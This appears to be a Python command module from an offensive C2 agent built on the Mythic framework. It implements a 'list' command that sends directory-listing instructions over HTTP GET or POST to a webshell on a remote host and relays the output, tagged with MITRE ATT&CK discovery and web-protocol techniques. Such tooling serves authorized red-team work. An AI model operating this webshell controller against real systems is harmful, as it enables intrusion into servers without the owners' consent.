from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from enyxma.WebshellRPC import WebshellRPC
import logging

logger = logging.getLogger(__name__)

class ListArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        # 'directory_path' is optional; default to "."
        self.args = [
            CommandParameter(
                name="directory_path",
                type=ParameterType.String,
                description="Remote directory directory_path to list (defaults to current working directory)",
                default_value=".",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            )
        ]

    async def parse_arguments(self):
        """
        If the shell invoked with JSON (file browser), load it.
        Otherwise, if there's a raw CLI argument, override 'directory_path'.
        If nothing is passed, leave the default "." in place.
        """
        if self.command_line:
            if self.command_line.strip().startswith("{"):
                # UI file‑browser will send JSON with at least {"directory_path": "..."}
                self.load_args_from_json_string(self.command_line)
            elif self.command_line.strip():
                # CLI: list <somedirectory_path>
                self.add_arg("directory_path", self.command_line.strip())

class ListCommand(CommandBase):
    cmd = "list"
    needs_admin = False
    help_cmd = "list [directory_path]"
    description = "List files and directories at the given directory_path on the remote system"
    version = 1
    author = "@Termindiego25"
    argument_class = ListArguments
    supported_ui_features = ["file_browser:list"]
    browser_script = BrowserScript(script_name="list", author="@Termindiego25", for_new_ui=True)
    attackmapping = ["T1083", "T1071.001", "T1132.001"]

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        """
        Send `list [directory_path>]` to the webshell and mark the task completed.
        """
        user_input = taskData.args.get_arg("directory_path")
        # if no args passed → keep default_value "."
        if user_input == "":
            user_input = "."
        cmd = f"list {user_input}"
        logger.info(f"[list] preparing command: {cmd}")

        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
            Completed=True,
            DisplayParams=taskData.args.get_arg("directory_path")
        )

        try:
            method = taskData.C2Profiles[0].Parameters.get("request_type", "POST").upper()
            if method == "GET":
                data = await WebshellRPC.GetRequest(taskData.Payload.UUID, cmd.encode(), taskData)
            else:
                data = await WebshellRPC.PostRequest(taskData.Payload.UUID, cmd.encode(), taskData)

            if not data:
                # no output → probably empty dir or error, still complete
                response.Success = True
                return response

            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=taskData.Task.ID,
                Response=data
            ))
        except Exception as e:
            logger.exception("[list] error executing WebshellRPC")
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=taskData.Task.ID,
                Response=f"Error listing directory: {e}".encode()
            ))

        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        # All output was already sent in create_go_tasking
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)